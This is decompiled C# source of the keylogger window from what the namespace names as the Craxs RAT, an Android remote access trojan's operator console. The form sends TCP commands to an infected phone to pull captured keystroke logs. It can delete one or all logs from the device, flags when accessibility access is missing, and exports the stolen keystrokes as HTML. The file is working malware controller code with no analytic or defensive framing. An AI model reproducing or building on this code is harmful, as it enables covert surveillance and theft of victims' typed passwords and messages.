using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using DrakeUI.Framework;
using MetroSet_UI.Controls;
using MetroSet_UI.Enums;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat
{
	// Token: 0x020000D6 RID: 214
	[DesignerGenerated]
	public partial class Keylogger : Form
	{
		// Token: 0x06001025 RID: 4133 RVA: 0x000ABE7C File Offset: 0x000AA07C
		public Keylogger()
		{
			base.Load += this.Keylogger_Load;
			base.Closing += this.Keylogger_Closing;
			this.string_0 = "null";
			this.bool_0 = false;
			this.InitializeComponent();
			this.Font = Module8.font_1;
			this.method_0();
		}

		// Token: 0x170004E5 RID: 1253
		// (get) Token: 0x06001028 RID: 4136 RVA: 0x00006FAC File Offset: 0x000051AC
		// (set) Token: 0x06001029 RID: 4137 RVA: 0x000AD220 File Offset: 0x000AB420
		internal virtual System.Windows.Forms.Timer TOpacity
		{
			[CompilerGenerated]
			get
			{
				return this._TOpacity;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.TOpacity_Tick);
				System.Windows.Forms.Timer topacity = this._TOpacity;
				if (topacity != null)
				{
					topacity.Tick -= value2;
				}
				this._TOpacity = value;
				topacity = this._TOpacity;
				if (topacity != null)
				{
					topacity.Tick += value2;
				}
			}
		}

		// Token: 0x170004CE RID: 1230
		// (get) Token: 0x0600102A RID: 4138 RVA: 0x00006FB4 File Offset: 0x000051B4
		// (set) Token: 0x0600102B RID: 4139 RVA: 0x000AD264 File Offset: 0x000AB464
		internal virtual DataGridView DGV0 { get; set; }

		// Token: 0x170004CF RID: 1231
		// (get) Token: 0x0600102C RID: 4140 RVA: 0x00006FBC File Offset: 0x000051BC
		// (set) Token: 0x0600102D RID: 4141 RVA: 0x000AD278 File Offset: 0x000AB478
		internal virtual ContextMenuStrip ctxMenu { get; set; }

		// Token: 0x170004D0 RID: 1232
		// (get) Token: 0x0600102E RID: 4142 RVA: 0x00006FC4 File Offset: 0x000051C4
		// (set) Token: 0x0600102F RID: 4143 RVA: 0x000AD28C File Offset: 0x000AB48C
		internal virtual ToolStripMenuItem SaveToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._SaveToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.SaveToolStripMenuItem_Click);
				ToolStripMenuItem saveToolStripMenuItem = this._SaveToolStripMenuItem;
				if (saveToolStripMenuItem != null)
				{
					saveToolStripMenuItem.Click -= value2;
				}
				this._SaveToolStripMenuItem = value;
				saveToolStripMenuItem = this._SaveToolStripMenuItem;
				if (saveToolStripMenuItem != null)
				{
					saveToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170004D1 RID: 1233
		// (get) Token: 0x06001030 RID: 4144 RVA: 0x00006FCC File Offset: 0x000051CC
		// (set) Token: 0x06001031 RID: 4145 RVA: 0x000AD2D0 File Offset: 0x000AB4D0
		internal virtual ToolStripMenuItem SaveAsToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._SaveAsToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.SaveAsToolStripMenuItem_Click);
				ToolStripMenuItem saveAsToolStripMenuItem = this._SaveAsToolStripMenuItem;
				if (saveAsToolStripMenuItem != null)
				{
					saveAsToolStripMenuItem.Click -= value2;
				}
				this._SaveAsToolStripMenuItem = value;
				saveAsToolStripMenuItem = this._SaveAsToolStripMenuItem;
				if (saveAsToolStripMenuItem != null)
				{
					saveAsToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170004D2 RID: 1234
		// (get) Token: 0x06001032 RID: 4146 RVA: 0x00006FD4 File Offset: 0x000051D4
		// (set) Token: 0x06001033 RID: 4147 RVA: 0x000AD314 File Offset: 0x000AB514
		internal virtual DataGridView DataGridView1 { get; set; }

		// Token: 0x170004D3 RID: 1235
		// (get) Token: 0x06001034 RID: 4148 RVA: 0x00006FDC File Offset: 0x000051DC
		// (set) Token: 0x06001035 RID: 4149 RVA: 0x000AD328 File Offset: 0x000AB528
		internal virtual MetroSetComboBox combologs { get; set; }

		// Token: 0x170004D4 RID: 1236
		// (get) Token: 0x06001036 RID: 4150 RVA: 0x00006FE4 File Offset: 0x000051E4
		// (set) Token: 0x06001037 RID: 4151 RVA: 0x000AD33C File Offset: 0x000AB53C
		internal virtual Button getbtn
		{
			[CompilerGenerated]
			get
			{
				return this._getbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.getbtn_Click);
				Button getbtn = this._getbtn;
				if (getbtn != null)
				{
					getbtn.Click -= value2;
				}
				this._getbtn = value;
				getbtn = this._getbtn;
				if (getbtn != null)
				{
					getbtn.Click += value2;
				}
			}
		}

		// Token: 0x170004D5 RID: 1237
		// (get) Token: 0x06001038 RID: 4152 RVA: 0x00006FEC File Offset: 0x000051EC
		// (set) Token: 0x06001039 RID: 4153 RVA: 0x000AD380 File Offset: 0x000AB580
		internal virtual Panel Panel1 { get; set; }

		// Token: 0x170004D6 RID: 1238
		// (get) Token: 0x0600103A RID: 4154 RVA: 0x00006FF4 File Offset: 0x000051F4
		// (set) Token: 0x0600103B RID: 4155 RVA: 0x000AD394 File Offset: 0x000AB594
		internal virtual Button Button2
		{
			[CompilerGenerated]
			get
			{
				return this._Button2;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Button2_Click);
				Button button = this._Button2;
				if (button != null)
				{
					button.Click -= value2;
				}
				this._Button2 = value;
				button = this._Button2;
				if (button != null)
				{
					button.Click += value2;
				}
			}
		}

		// Token: 0x170004D7 RID: 1239
		// (get) Token: 0x0600103C RID: 4156 RVA: 0x00006FFC File Offset: 0x000051FC
		// (set) Token: 0x0600103D RID: 4157 RVA: 0x000AD3D8 File Offset: 0x000AB5D8
		internal virtual DrakeUITabControl keytabs { get; set; }

		// Token: 0x170004D8 RID: 1240
		// (get) Token: 0x0600103E RID: 4158 RVA: 0x00007004 File Offset: 0x00005204
		// (set) Token: 0x0600103F RID: 4159 RVA: 0x000AD3EC File Offset: 0x000AB5EC
		internal virtual TabPage TabPage3 { get; set; }

		// Token: 0x170004D9 RID: 1241
		// (get) Token: 0x06001040 RID: 4160 RVA: 0x0000700C File Offset: 0x0000520C
		// (set) Token: 0x06001041 RID: 4161 RVA: 0x000AD400 File Offset: 0x000AB600
		internal virtual TabPage TabPage4 { get; set; }

		// Token: 0x170004DA RID: 1242
		// (get) Token: 0x06001042 RID: 4162 RVA: 0x00007014 File Offset: 0x00005214
		// (set) Token: 0x06001043 RID: 4163 RVA: 0x000AD414 File Offset: 0x000AB614
		internal virtual DataGridViewTextBoxColumn appnam { get; set; }

		// Token: 0x170004DB RID: 1243
		// (get) Token: 0x06001044 RID: 4164 RVA: 0x0000701C File Offset: 0x0000521C
		// (set) Token: 0x06001045 RID: 4165 RVA: 0x000AD428 File Offset: 0x000AB628
		internal virtual DataGridViewTextBoxColumn texts { get; set; }

		// Token: 0x170004DC RID: 1244
		// (get) Token: 0x06001046 RID: 4166 RVA: 0x00007024 File Offset: 0x00005224
		// (set) Token: 0x06001047 RID: 4167 RVA: 0x000AD43C File Offset: 0x000AB63C
		internal virtual DrakeUILoadingBar loadinglogs { get; set; }

		// Token: 0x170004DD RID: 1245
		// (get) Token: 0x06001048 RID: 4168 RVA: 0x0000702C File Offset: 0x0000522C
		// (set) Token: 0x06001049 RID: 4169 RVA: 0x000AD450 File Offset: 0x000AB650
		internal virtual Button savedbtn
		{
			[CompilerGenerated]
			get
			{
				return this._savedbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.savedbtn_Click);
				Button savedbtn = this._savedbtn;
				if (savedbtn != null)
				{
					savedbtn.Click -= value2;
				}
				this._savedbtn = value;
				savedbtn = this._savedbtn;
				if (savedbtn != null)
				{
					savedbtn.Click += value2;
				}
			}
		}

		// Token: 0x170004DE RID: 1246
		// (get) Token: 0x0600104A RID: 4170 RVA: 0x00007034 File Offset: 0x00005234
		// (set) Token: 0x0600104B RID: 4171 RVA: 0x000AD494 File Offset: 0x000AB694
		internal virtual DataGridViewTextBoxColumn Column1 { get; set; }

		// Token: 0x170004DF RID: 1247
		// (get) Token: 0x0600104C RID: 4172 RVA: 0x0000703C File Offset: 0x0000523C
		// (set) Token: 0x0600104D RID: 4173 RVA: 0x000AD4A8 File Offset: 0x000AB6A8
		internal virtual DataGridViewTextBoxColumn Column6 { get; set; }

		// Token: 0x170004E0 RID: 1248
		// (get) Token: 0x0600104E RID: 4174 RVA: 0x00007044 File Offset: 0x00005244
		// (set) Token: 0x0600104F RID: 4175 RVA: 0x000AD4BC File Offset: 0x000AB6BC
		internal virtual DataGridViewTextBoxColumn Column3 { get; set; }

		// Token: 0x170004E1 RID: 1249
		// (get) Token: 0x06001050 RID: 4176 RVA: 0x0000704C File Offset: 0x0000524C
		// (set) Token: 0x06001051 RID: 4177 RVA: 0x000AD4D0 File Offset: 0x000AB6D0
		internal virtual DataGridViewImageColumn Column2 { get; set; }

		// Token: 0x170004E2 RID: 1250
		// (get) Token: 0x06001052 RID: 4178 RVA: 0x00007054 File Offset: 0x00005254
		// (set) Token: 0x06001053 RID: 4179 RVA: 0x000AD4E4 File Offset: 0x000AB6E4
		internal virtual Button delbtn
		{
			[CompilerGenerated]
			get
			{
				return this._delbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.delbtn_Click);
				Button delbtn = this._delbtn;
				if (delbtn != null)
				{
					delbtn.Click -= value2;
				}
				this._delbtn = value;
				delbtn = this._delbtn;
				if (delbtn != null)
				{
					delbtn.Click += value2;
				}
			}
		}

		// Token: 0x170004E3 RID: 1251
		// (get) Token: 0x06001054 RID: 4180 RVA: 0x0000705C File Offset: 0x0000525C
		// (set) Token: 0x06001055 RID: 4181 RVA: 0x000AD528 File Offset: 0x000AB728
		internal virtual Button deleteallbtn
		{
			[CompilerGenerated]
			get
			{
				return this._deleteallbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.deleteallbtn_Click);
				Button deleteallbtn = this._deleteallbtn;
				if (deleteallbtn != null)
				{
					deleteallbtn.Click -= value2;
				}
				this._deleteallbtn = value;
				deleteallbtn = this._deleteallbtn;
				if (deleteallbtn != null)
				{
					deleteallbtn.Click += value2;
				}
			}
		}

		// Token: 0x170004E4 RID: 1252
		// (get) Token: 0x06001056 RID: 4182 RVA: 0x00007064 File Offset: 0x00005264
		// (set) Token: 0x06001057 RID: 4183 RVA: 0x000AD56C File Offset: 0x000AB76C
		internal virtual Button backallbtn
		{
			[CompilerGenerated]
			get
			{
				return this._backallbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.backallbtn_Click);
				Button backallbtn = this._backallbtn;
				if (backallbtn != null)
				{
					backallbtn.Click -= value2;
				}
				this._backallbtn = value;
				backallbtn = this._backallbtn;
				if (backallbtn != null)
				{
					backallbtn.Click += value2;
				}
			}
		}

		// Token: 0x06001058 RID: 4184 RVA: 0x000AD5B0 File Offset: 0x000AB7B0
		public void method_0()
		{
			string left = Module4.smethod_1();
			if (Operators.CompareString(left, "AR", false) != 0)
			{
				if (Operators.CompareString(left, "CN", false) == 0)
				{
					this.getbtn.Text = "得到";
					this.delbtn.Text = "删除";
					this.savedbtn.Text = "已下载";
					this.backallbtn.Text = "全部下载";
					this.deleteallbtn.Text = "删除所有";
					this.keytabs.TabPages[0].Text = "在线的";
					this.keytabs.TabPages[1].Text = "离线";
				}
			}
			else
			{
				this.getbtn.Text = "تحميل السجل";
				this.delbtn.Text = "حذف السجل";
				this.savedbtn.Text = "تم تنزيله";
				this.backallbtn.Text = "تحميل الكل";
				this.deleteallbtn.Text = "حذف الكل";
				this.keytabs.TabPages[0].Text = "مباشر";
				this.keytabs.TabPages[1].Text = "مسجل";
			}
		}

		// Token: 0x06001059 RID: 4185 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_1()
		{
		}

		// Token: 0x0600105A RID: 4186 RVA: 0x000AD6F8 File Offset: 0x000AB8F8
		private void TOpacity_Tick(object sender, EventArgs e)
		{
			if (base.Opacity != 1.0)
			{
				base.Opacity += 0.1;
			}
			else
			{
				this.TOpacity.Enabled = false;
			}
		}

		// Token: 0x0600105B RID: 4187 RVA: 0x000AD740 File Offset: 0x000AB940
		private void Keylogger_Load(object sender, EventArgs e)
		{
			this.ctxMenu.Renderer = new GClass12();
			this.DGV0.ColumnHeadersDefaultCellStyle.Font = Module8.font_1;
			this.DGV0.DefaultCellStyle.Font = Module8.font_1;
			this.DGV0.ContextMenuStrip = this.ctxMenu;
			base.Icon = new Icon(Module8.string_1 + "\\Icons\\win\\19.ico");
			this.Text = this.string_0;
			this.method_1();
			this.SaveToolStripMenuItem.Visible = true;
			this.SaveAsToolStripMenuItem.Visible = true;
			this.TOpacity.Interval = Module5.int_0;
			this.TOpacity.Enabled = true;
		}

		// Token: 0x0600105C RID: 4188 RVA: 0x000AD7F8 File Offset: 0x000AB9F8
		private void getbtn_Click(object sender, EventArgs e)
		{
			if (this.bool_0)
			{
				if (!(this.combologs.Text.Length < 1 | this.combologs.Text == null))
				{
					if (this.gclass8_0 == null)
					{
						return;
					}
					try
					{
						string[] array = this.gclass8_0.string_0.Split(new char[]
						{
							':'
						});
						object[] objects_ = new object[]
						{
							this.tcpClient_0,
							string.Concat(new string[]
							{
								Module13.string_29,
								GClass9.string_0,
								"rd<*>",
								this.combologs.Text,
								GClass9.string_0,
								array[0],
								GClass9.string_0,
								array[1],
								GClass9.string_0,
								Module13.string_5,
								GClass9.string_0,
								Conversions.ToString(0),
								GClass9.string_0,
								Conversions.ToString(0),
								GClass9.string_0,
								GClass9.string_3,
								GClass9.string_0,
								this.gclass8_0.string_2
							}),
							Module2.smethod_9().GetBytes("null"),
							this.gclass8_0
						};
						this.gclass8_0.method_2(objects_);
						this.loadinglogs.Enabled = true;
						this.loadinglogs.Visible = true;
						return;
					}
					catch (Exception ex)
					{
						return;
					}
				}
				Interaction.MsgBox("No  Logs Found...", MsgBoxStyle.OkOnly, null);
			}
			else
			{
				Interaction.MsgBox("Accessibilty Not Enabled.", MsgBoxStyle.OkOnly, null);
			}
		}

		// Token: 0x0600105D RID: 4189 RVA: 0x000AD9B0 File Offset: 0x000ABBB0
		private void Button2_Click(object sender, EventArgs e)
		{
			if (!this.bool_0)
			{
				Interaction.MsgBox("Accessibilty Not Enabled.", MsgBoxStyle.OkOnly, null);
			}
			else if (this.combologs.Text.Length < 1 | this.combologs.Text == null)
			{
				Interaction.MsgBox("No  Logs Found...", MsgBoxStyle.OkOnly, null);
			}
			else if (MessageBox.Show("Log will deleted completely ,\r\nAccept ?", "Keylogger", MessageBoxButtons.YesNo) == DialogResult.Yes && this.gclass8_0 != null)
			{
				try
				{
					string[] array = this.gclass8_0.string_0.Split(new char[]
					{
						':'
					});
					object[] objects_ = new object[]
					{
						this.tcpClient_0,
						Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Module13.string_29 + GClass9.string_0 + "rdd<*>", Module2.smethod_28(this.combologs.Text)), GClass9.string_0), array[0]), GClass9.string_0), array[1]), GClass9.string_0), Module13.string_5), GClass9.string_0), Conversions.ToString(0)), GClass9.string_0), Conversions.ToString(0)), GClass9.string_0), GClass9.string_3), GClass9.string_0), this.gclass8_0.string_2),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_0
					};
					this.gclass8_0.method_2(objects_);
					this.combologs.Text = "";
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x0600105E RID: 4190 RVA: 0x000ADB88 File Offset: 0x000ABD88
		public void method_6(object[] objects_0)
		{
			if (!this.DataGridView1.InvokeRequired)
			{
				if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(objects_0[2], "[]", false))))
				{
					this.DataGridView1.Rows.Add(new object[]
					{
						objects_0[1],
						objects_0[2]
					});
				}
			}
			else
			{
				Keylogger.GDelegate24 method = new Keylogger.GDelegate24(this.method_6);
				this.DataGridView1.Invoke(method, new object[]
				{
					objects_0
				});
			}
		}

		// Token: 0x0600105F RID: 4191 RVA: 0x000ADC08 File Offset: 0x000ABE08
		public void method_7()
		{
			if (this.DataGridView1.InvokeRequired)
			{
				Keylogger.GDelegate25 method = new Keylogger.GDelegate25(this.method_7);
				this.DataGridView1.Invoke(method, new object[0]);
			}
			else
			{
				this.loadinglogs.Enabled = false;
				this.loadinglogs.Visible = false;
				this.DataGridView1.Rows.Clear();
			}
		}

		// Token: 0x06001060 RID: 4192 RVA: 0x000ADC6C File Offset: 0x000ABE6C
		private void savedbtn_Click(object sender, EventArgs e)
		{
			try
			{
				if (!Directory.Exists(this.gclass8_0.string_10 + "\\OFFLINE_KEYLOGS"))
				{
					Directory.CreateDirectory(this.gclass8_0.string_10 + "\\OFFLINE_KEYLOGS");
				}
				Process.Start(this.gclass8_0.string_10 + "\\OFFLINE_KEYLOGS");
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06001061 RID: 4193 RVA: 0x000ADCF0 File Offset: 0x000ABEF0
		private void delbtn_Click(object sender, EventArgs e)
		{
			if (this.bool_0)
			{
				if (!(this.combologs.Text.Length < 1 | this.combologs.Text == null))
				{
					if (this.gclass8_0 == null)
					{
						return;
					}
					try
					{
						try
						{
							string text = "this record will be removed completely from the phone , continue ?";
							string left = Module4.smethod_1();
							if (Operators.CompareString(left, "AR", false) == 0)
							{
								text = "سيتم حذف هذا السجل بالكامل من الهاتف ، هل تريد المتابعة؟";
							}
							else if (Operators.CompareString(left, "CN", false) == 0)
							{
								text = "这条记录将从手机中彻底删除，继续吗？";
							}
							if (MessageBox.Show(text, "Keylogger", MessageBoxButtons.YesNo) != DialogResult.Yes)
							{
								return;
							}
						}
						catch (Exception ex)
						{
						}
						string[] array = this.gclass8_0.string_0.Split(new char[]
						{
							':'
						});
						object[] objects_ = new object[]
						{
							this.tcpClient_0,
							string.Concat(new string[]
							{
								Module13.string_29,
								GClass9.string_0,
								"rdd<*>",
								this.combologs.Text,
								GClass9.string_0,
								array[0],
								GClass9.string_0,
								array[1],
								GClass9.string_0,
								Module13.string_5,
								GClass9.string_0,
								Conversions.ToString(0),
								GClass9.string_0,
								Conversions.ToString(0),
								GClass9.string_0,
								GClass9.string_3,
								GClass9.string_0,
								this.gclass8_0.string_2
							}),
							Module2.smethod_9().GetBytes("null"),
							this.gclass8_0
						};
						this.gclass8_0.method_2(objects_);
						this.combologs.Items.Remove(this.combologs.Text);
						this.combologs.Text = "";
						return;
					}
					catch (Exception ex2)
					{
						return;
					}
				}
				Interaction.MsgBox("No  Logs Found...", MsgBoxStyle.OkOnly, null);
			}
			else
			{
				Interaction.MsgBox("Accessibilty Not Enabled.", MsgBoxStyle.OkOnly, null);
			}
		}

		// Token: 0x06001062 RID: 4194 RVA: 0x000ADF38 File Offset: 0x000AC138
		private void deleteallbtn_Click(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				try
				{
					try
					{
						string text = "All record will be removed completely from the phone , continue ?";
						string left = Module4.smethod_1();
						if (Operators.CompareString(left, "AR", false) != 0)
						{
							if (Operators.CompareString(left, "CN", false) == 0)
							{
								text = "所有记录将从手机中完全删除，继续吗？";
							}
						}
						else
						{
							text = "سيتم حذف جميع السجل بالكامل من الهاتف ، هل تريد المتابعة؟";
						}
						if (MessageBox.Show(text, "Keylogger", MessageBoxButtons.YesNo) != DialogResult.Yes)
						{
							return;
						}
					}
					catch (Exception ex)
					{
					}
					string[] array = this.gclass8_0.string_0.Split(new char[]
					{
						':'
					});
					object[] objects_ = new object[]
					{
						this.tcpClient_0,
						string.Concat(new string[]
						{
							Module13.string_29,
							GClass9.string_0,
							"rdall<*>r",
							GClass9.string_0,
							array[0],
							GClass9.string_0,
							array[1],
							GClass9.string_0,
							Module13.string_5,
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							GClass9.string_3,
							GClass9.string_0,
							this.gclass8_0.string_2
						}),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_0
					};
					this.gclass8_0.method_2(objects_);
					this.combologs.Items.Clear();
					this.combologs.Text = "";
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x06001063 RID: 4195 RVA: 0x000AE118 File Offset: 0x000AC318
		private void backallbtn_Click(object sender, EventArgs e)
		{
			if (this.combologs.Items.Count < 1)
			{
				Interaction.MsgBox("No  Logs Found...", MsgBoxStyle.OkOnly, null);
			}
			else if (this.gclass8_0 != null)
			{
				try
				{
					string[] array = this.gclass8_0.string_0.Split(new char[]
					{
						':'
					});
					object[] objects_ = new object[]
					{
						this.tcpClient_0,
						string.Concat(new string[]
						{
							Module13.string_29,
							GClass9.string_0,
							"rdall<*>g",
							GClass9.string_0,
							array[0],
							GClass9.string_0,
							array[1],
							GClass9.string_0,
							Module13.string_5,
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							GClass9.string_3,
							GClass9.string_0,
							this.gclass8_0.string_2
						}),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_0
					};
					this.gclass8_0.method_2(objects_);
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06001064 RID: 4196 RVA: 0x000AE274 File Offset: 0x000AC474
		private void Keylogger_Closing(object sender, CancelEventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				this.gclass8_0.bool_5 = false;
				object[] objects_ = new object[]
				{
					this.tcpClient_0,
					Module13.string_36 + GClass9.string_0 + Module13.string_24,
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
			}
		}

		// Token: 0x06001065 RID: 4197 RVA: 0x000AE2E8 File Offset: 0x000AC4E8
		private void SaveToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Module8.smethod_5(this.gclass8_0);
			ThreadPool.QueueUserWorkItem((Keylogger.Class21.waitCallback_0 != null) ? Keylogger.Class21.waitCallback_0 : (Keylogger.Class21.waitCallback_0 = new WaitCallback(Keylogger.Class21.class21_0.method_0)), new object[]
			{
				this.DGV0,
				this.object_0,
				"Keylogger",
				this.object_1,
				this.string_1 + " - " + this.string_2,
				"Keylogger",
				"log",
				DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html"
			});
		}

		// Token: 0x06001066 RID: 4198 RVA: 0x000AE39C File Offset: 0x000AC59C
		private void SaveAsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.FileName = DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html";
			saveFileDialog.Filter = "html (*.html)|*.html";
			if (saveFileDialog.ShowDialog() == DialogResult.OK)
			{
				ThreadPool.QueueUserWorkItem((Keylogger.Class21.waitCallback_1 != null) ? Keylogger.Class21.waitCallback_1 : (Keylogger.Class21.waitCallback_1 = new WaitCallback(Keylogger.Class21.class21_0.method_1)), new object[]
				{
					this.DGV0,
					"null",
					saveFileDialog.FileName,
					this.object_1,
					this.string_1 + " - " + this.string_2,
					"Keylogger",
					"log",
					"null"
				});
			}
			saveFileDialog.Dispose();
		}

		// Token: 0x040008E7 RID: 2279
		public TcpClient tcpClient_0;

		// Token: 0x040008E8 RID: 2280
		public GClass8 gclass8_0;

		// Token: 0x040008E9 RID: 2281
		public string string_0;

		// Token: 0x040008EA RID: 2282
		public bool bool_0;

		// Token: 0x040008EB RID: 2283
		public string object_0;

		// Token: 0x040008EC RID: 2284
		public string object_1;

		// Token: 0x040008ED RID: 2285
		public string string_1;

		// Token: 0x040008EE RID: 2286
		public string string_2;

		// Token: 0x020000D7 RID: 215
		// (Invoke) Token: 0x0600106A RID: 4202
		public delegate void GDelegate24(object[] objects_0);

		// Token: 0x020000D8 RID: 216
		// (Invoke) Token: 0x0600106E RID: 4206
		public delegate void GDelegate25();

		// Token: 0x020000D9 RID: 217
		[CompilerGenerated]
		[Serializable]
		internal sealed class Class21
		{
			// Token: 0x06001071 RID: 4209 RVA: 0x00021A70 File Offset: 0x0001FC70
			internal void method_0(object _object_0)
			{
				Module8.smethod_13((Array)_object_0);
			}

			// Token: 0x06001072 RID: 4210 RVA: 0x00021A70 File Offset: 0x0001FC70
			internal void method_1(object _object_1)
			{
				Module8.smethod_13((Array)_object_1);
			}

			// Token: 0x040008EF RID: 2287
			public static readonly Keylogger.Class21 class21_0 = new Keylogger.Class21();

			// Token: 0x040008F0 RID: 2288
			public static WaitCallback waitCallback_0;

			// Token: 0x040008F1 RID: 2289
			public static WaitCallback waitCallback_1;
		}
	}
}
